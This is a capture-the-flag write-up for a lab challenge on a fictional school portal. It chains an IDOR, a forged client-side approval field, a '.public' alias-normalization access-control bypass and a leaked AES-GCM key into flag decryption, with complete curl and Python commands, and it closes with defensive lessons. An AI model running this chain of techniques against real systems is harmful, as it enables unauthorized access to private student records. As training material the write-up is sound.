# Detention for the Curious

**Category:** Cryptography / Web Exploitation
**Difficulty:** Intermediate
**Points:** 300
**Status:** Solved (Verified)

---

## 1. Challenge Overview

The "Saroni Girls Secondary School" portal exposes unauthenticated JSON APIs. Though each endpoint appears benign individually, they chain into a full **IDOR → broken access control → key disclosure → AES-GCM decryption** path. The objective is to walk the chain of leaked identifiers, abuse an alias-normalization flaw to read a restricted archive document, retrieve the legacy encryption key and ciphertext, and decrypt the flag.

---

## 2. Initial Analysis

### Base URL
`https://8a43ac9e85e8.labs.ctfroom.com` (per-account lab instance)

### API Endpoints

| Page | API |
|------|-----|
| `/directory` | `GET /api/directory` |
| `/academics` | `GET /api/academics/report?student_id=...` |
| `/discipline` | `GET /api/discipline/cases/<ref>` |
| `/documents` | `POST /api/documents/request` |
| `/archive` | `GET /api/archive/manifest?ref=...&token=...` |
| `/notices` | Static |

The `/archive` page hints: *"Archive search accepts historical display aliases. Legacy documents sometimes have a `.public` suffix; the index normalizes these aliases when retrieving records."*

---

## 3. Investigation and Methodology

### 3.1 Directory → Internal Reference (IDOR Seed)

```bash
curl -s "$B/api/directory"
```
```json
{
  "students": [
    {"name":"Amina Otieno","internal_ref":"SG-1001"},
    {"name":"Nadia Wanjiku","internal_ref":"SG-1042","record_note":"Archived academic report"},
    {"name":"Mercy Njeri","internal_ref":"SG-1016"}
  ]
}
```
`SG-1042` flagged as having an archived report — target identified.

### 3.2 Academics IDOR → Disciplinary Case

The academics page only requests `SG-1001`, but endpoint accepts arbitrary `student_id`:
```bash
curl -s "$B/api/academics/report?student_id=SG-1042"
```
```json
{
  "student":"Nadia Wanjiku",
  "average":"A-",
  "term":"II",
  "disciplinary_case":"DC-271"
}
```
Leaks disciplinary case **DC-271**.

### 3.3 Discipline Lookup → Workflow + Archive References

```bash
curl -s "$B/api/discipline/cases/DC-271"
```
```json
{
  "case_id":"DC-271",
  "summary":"Historical document dispute",
  "status":"Archived",
  "internal_workflow":"WF-271-A",
  "archive_reference":"ARC-271",
  "approval_state":"pending"
}
```
Leaks workflow **WF-271-A** and archive reference **ARC-271**.

### 3.4 Document Request → Archive Token (Client-Trusted Authorization)

`/api/documents/request` accepts client-supplied `approval_state`. Case is `pending`, but server doesn't re-check — send `approved`:
```bash
curl -s -X POST "$B/api/documents/request" \
  -H 'Content-Type: application/json' \
  -d '{"workflow":"WF-271-A","approval_state":"approved"}'
```
```json
{
  "status":"issued",
  "archive_token":"d385e02212f441f8d8c3ea93",
  "document_reference":"ARC-271",
  "archive_page":"/archive"
}
```
Valid **archive token** obtained.

### 3.5 Alias Normalization Bypass → Restricted Manifest

With valid token, `ARC-271` still blocked:
```bash
curl -s "$B/api/archive/manifest?ref=ARC-271&token=d385e02212f441f8d8c3ea93"
# {"error":"Restricted archive document"}
```

The `.public` hint pays off: ACL check runs on the **alias** (`ARC-271.public` looks public and passes), but retrieval **normalizes** the alias back to `ARC-271` and returns the restricted record — classic parser-mismatch / normalization bug:
```bash
curl -s "$B/api/archive/manifest?ref=ARC-271.public&token=d385e02212f441f8d8c3ea93"
```
```json
{
  "document":"ARC-271",
  "evidence_endpoint":"/api/archive/evidence",
  "legacy_backup":"/api/archive/legacy-config",
  "note":"Legacy archive encryption profile"
}
```
Only `ARC-271.public` works (`.PUBLIC` or space before it 404s), confirming narrow string-suffix check.

### 3.6 Session Cookie → Protected Sub-Endpoints

`evidence` and `legacy-config` endpoints return `"Archive manifest required"` until presenting the `saroni_session` cookie set by the manifest response:
```bash
J=cj.txt
curl -s -c "$J" "$B/api/archive/manifest?ref=ARC-271.public&token=d385e02212f441f8d8c3ea93" >/dev/null
curl -s -b "$J" "$B/api/archive/legacy-config"
```
```json
{
  "profile":"saroni-legacy-2026",
  "algorithm":"AES-128-GCM",
  "key_encoding":"base64",
  "key":"gyB4sr9TkuujHp358RwNfg=="
}
```
```bash
curl -s -b "$J" "$B/api/archive/evidence"
```
```json
{
  "algorithm":"AES-128-GCM",
  "nonce":"EAXTryuJ/cWNYTmp",
  "ciphertext":"i195ChgBxlfEQOkCwH5ItZrVffD0tVj2ILj51FIXQ2TTlA318DHV7aC0rg==",
  "tag":"UzP2tQ6RxyE13e9TqaRYKw==",
  "aad":"SARONI-2026",
  "encoding":"base64"
}
```
Server hands over **key, nonce, ciphertext, tag, AAD** — everything needed to decrypt.

### 3.7 AES-128-GCM Decryption → Flag

```python
import base64
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

key   = base64.b64decode('gyB4sr9TkuujHp358RwNfg==')
nonce = base64.b64decode('EAXTryuJ/cWNYTmp')
ct    = base64.b64decode('i195ChgBxlfEQOkCwH5ItZrVffD0tVj2ILj51FIXQ2TTlA318DHV7aC0rg==')
tag   = base64.b64decode('UzP2tQ6RxyE13e9TqaRYKw==')
aad   = b'SARONI-2026'

print(AESGCM(key).decrypt(nonce, ct + tag, aad).decode())
```
**Note**: `cryptography` expects tag appended to ciphertext (`ct + tag`), and AAD must match (`SARONI-2026`) or tag check fails.

---

## 4. Vulnerability / Technical Discovery

| # | Vulnerability | Description |
|---|---------------|-------------|
| 1 | **IDOR** | `/api/academics/report` and directory expose enumerable internal references cross-linking students to disciplinary cases |
| 2 | **Client-Trusted Authorization** | `/api/documents/request` mints valid archive token when client claims `approval_state: approved`, ignoring real `pending` state |
| 3 | **Alias-Normalization Mismatch** | ACL check runs on `.public` alias; retrieval strips suffix, letting "public" request return restricted document |
| 4 | **Secret Disclosure** | Archive exposes raw AES key and full GCM material (nonce/ct/tag/aad) to any session with manifest cookie |

---

## 5. Exploitation / Solution

Complete chain (run sequentially):
```bash
B="https://<lab-instance>.labs.ctfroom.com"
J=cj.txt

# 1. Get target student
curl -s "$B/api/directory" | jq '.students[] | select(.record_note=="Archived academic report")'

# 2. IDOR academics
curl -s "$B/api/academics/report?student_id=SG-1042" | jq '.disciplinary_case'

# 3. Discipline lookup
curl -s "$B/api/discipline/cases/DC-271" | jq '.internal_workflow, .archive_reference'

# 4. Forge approval
curl -s -X POST "$B/api/documents/request" -H 'Content-Type: application/json' \
  -d '{"workflow":"WF-271-A","approval_state":"approved"}' | jq '.archive_token'

# 5. Alias bypass + cookie
curl -s -c "$J" "$B/api/archive/manifest?ref=ARC-271.public&token=<token>" >/dev/null
curl -s -b "$J" "$B/api/archive/legacy-config"  # → key
curl -s -b "$J" "$B/api/archive/evidence"       # → nonce, ct, tag, aad
```

Then decrypt with Python (see Section 3.7).

---

## 6. Flag

```
LsCTF2026{d3t3nt10n_f0r_br34k1ng_th3_rul3s}
```
(Verified via AES-GCM tag authentication)

---

## 7. Lessons Learned

1. **Chain vulnerabilities** — Individual low-severity issues (IDOR, client-trusted state, normalization mismatch) combine into critical secret disclosure.
2. **Normalize before authorize** — Canonicalize identifiers **before** the authorization check, not after, so checked value equals retrieved value.
3. **Never trust client state** — Derive approval from authoritative record, never from request input.
4. **Keys don't belong in API responses** — Keep keys in KMS; decrypt server-side only after proper authz.
5. **AES-GCM requires exact parameters** — Key, nonce, ciphertext, tag, and AAD must all match; any deviation fails authentication.

---

## 8. Tools Used

- `curl` with cookie jar (`-c`, `-b`)
- `jq` for JSON parsing
- Python 3 with `cryptography` (AES-GCM)
- Browser dev tools for initial recon

---

## 9. Evidence and References

- `evidence/directory.json` — Student directory response
- `evidence/academics_SG-1042.json` — IDOR response
- `evidence/discipline_DC-271.json` — Case details
- `evidence/document_request.json` — Forged approval response
- `evidence/manifest_ARC-271.public.json` — Bypassed manifest
- `evidence/legacy-config.json` — Key disclosure
- `evidence/evidence.json` — Ciphertext package